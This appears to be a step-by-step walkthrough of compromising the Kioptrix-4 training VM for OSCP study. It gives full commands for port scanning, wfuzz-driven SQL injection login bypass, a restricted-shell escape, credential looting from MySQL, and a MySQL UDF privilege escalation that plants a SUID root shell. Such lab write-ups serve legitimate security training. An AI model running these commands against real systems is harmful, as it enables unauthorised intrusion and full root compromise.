This walkthrough provides comprehensive notes and commands for compromising the Kioptrix-4 virtual machine, demonstrating various techniques critical for the **OSCP** (Offensive Security Certified Professional) examination, including enumeration, web application attacks, shell escaping, and privilege escalation.

The video focuses on a "get-to-the-point" methodology, demonstrating a multi-stage attack involving Nmap, Wfuzz for SQL Injection, a restricted shell bypass, and an old-school MySQL User-Defined Function (UDF) exploit for root access.

-----

## 1\. Initial Enumeration

The first step is a thorough port and service scan to map out the target's attack surface.

| Tool | Command | Purpose | Notes/Results |
| :--- | :--- | :--- | :--- |
| **Nmap** | `nmap -p- -sV -sC [TARGET_IP] --open` | Full port scan with service version and default script enumeration. | **Open Ports:** **22** (SSH), **80** (HTTP), **139** (NetBIOS-SSN), **445** (microsoft-ds/SMB/CIFS). **OS:** Ubuntu Debian [[32:54](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=1974)]. |

## 2\. Web Exploitation (Port 80)

The target is running a custom web application. The primary attack vector is directory and file fuzzing to reveal hidden pages and then SQL injection to bypass the login.

### Web Fuzzing

Two terminal windows are used simultaneously for file and directory fuzzing with `wfuzz`.

| Tool | Command | Purpose | Notes/Results |
| :--- | :--- | :--- | :--- |
| **Wfuzz (Files)** | `wfuzz -c -z file -Z /path/to/raft-large-files.txt --hc 404 [TARGET_URL]/FUZZ` | Find hidden files. | Discovered: `index.php`, `member.php`, `checklogin.php`, `database.sql`, and others [[38:17](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=2297)]. |
| **Wfuzz (Dirs)** | `wfuzz -c -z file -Z /path/to/raft-large-directories.txt --hc 404 [TARGET_URL]/FUZZ/` | Find hidden directories. | Discovered: **john.php** and **robert.php**, revealing two valid usernames: **john** and **robert** [[39:22](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=2362)]. |

### SQL Injection Authentication Bypass

A **SQLi** vulnerability is confirmed by submitting an apostrophe (`'`) into the login form and receiving a verbose SQL error [[41:59](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=2519)].

A semi-automated Wfuzz attack is performed to find a working authentication bypass payload by filtering out common error response sizes (`109` and `264` bytes).

  * **POST Data:** The login form submits data as `myusername=[user]&mypassword=[pass]&submit=Login`.
  * **Wfuzz Command:**
    ```bash
    wfuzz -c -z file /usr/share/seclists/fuzzing/sqli/quick-sqli-checks.txt \
    -d "myusername=john&mypassword=FUZZ&submit=Login" \
    --hc 404,264,109 \
    http://[TARGET_IP]/checklogin.php
    ```
  * **Successful Payload:** `myusername=john&mypassword='*&submit=Login` [[49:55](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=2995)]
  * **Discovered Credential:**
      * **Username:** `john`
      * **Password:** `my name is john` [[51:16](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=3076)]

-----

## 3\. Initial Access & Restricted Shell Bypass (Port 22)

Valid credentials for `john` allow for a successful SSH login, but the user is placed in a **restricted shell** that blocks commands like `cd`, `ls`, and direct binary execution [[54:17](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=3257)].

| Step | Command | Result/Technique |
| :--- | :--- | :--- |
| **SSH Login** | `ssh john@[TARGET_IP]` | Initial access. |
| **Shell Bypass** | `echo os.system("/bin/bash")` | Escapes the restricted shell by leveraging the built-in `echo` command to execute Python's `os.system()` and spawn a new, full `/bin/bash` shell [[56:53](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=3413)]. |
| **Stabilize TTY** | `export TERM=linux` | Stabilizes the shell for better terminal function [[57:51](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=3471)]. |

-----

## 4\. Local Enumeration & Credential Looting

Once a full shell is obtained, the attack pivots to local enumeration, starting with the web root (`/var/www/html`) to search for database credentials.

  * **Command:** `grep -ri "sql" . --color=auto` or `grep -ri "db" . --color=auto`

  * **Discovered Database Credentials** [[59:36](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=3576)]:

      * **Database:** `members`
      * **User:** `root`
      * **Password:** **No Password**

  * **MySQL Login:**

    ```bash
    mysql -u root -p
    # Press Enter for password
    ```

  * **Looting Database:**

    ```sql
    use members;
    show tables;
    select * from members;
    ```

    This query reveals the credentials for user **robert**. The password is a fake Base64-encoded string, which, when decoded (or simply tested), is found to be `robert` [[01:00:47](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=3647)].

-----

## 5\. Privilege Escalation (MySQL UDF)

Since `sudo -l` shows no capabilities for `john` or `robert` [[01:02:14](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=3734)], the next step is to leverage the discovered **root** access to the local MySQL database for a system-level exploit.

This technique involves exploiting the MySQL process, which is running as the **root** user, by loading a User-Defined Function (UDF) to execute system commands.

### Privilege Escalation Steps

| Step | MySQL Command | Purpose |
| :--- | :--- | :--- |
| **Create UDF** | `create function sys_eval returns int soname 'udf_sys.so';` | Creates a function named `sys_eval` that is linked to a system library (`udf_sys.so`) capable of executing OS commands. |
| **Execute Command** | `select sys_eval('cp /bin/bash /var/temp/bash && chmod u+s /var/temp/bash');` | Uses the new `sys_eval` function to: **1.** Copy `/bin/bash` to a writable location (`/var/temp/bash`). **2.** Set the **SUID (Set User ID)** bit on the new binary (`chmod u+s`). |
| **Become Root** | `/var/temp/bash -p` | Executes the SUID bash binary with the **effective root privileges** granted by the SUID bit, achieving a full root shell [[01:15:39](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=4539)]. |

### Final Commands

  * `whoami`
  * `id`
  * `cat /root/congrats.txt` [[01:16:40](http://www.youtube.com/watch?v=c2OFrDVb3EM&t=4600)]

http://googleusercontent.com/youtube_content/0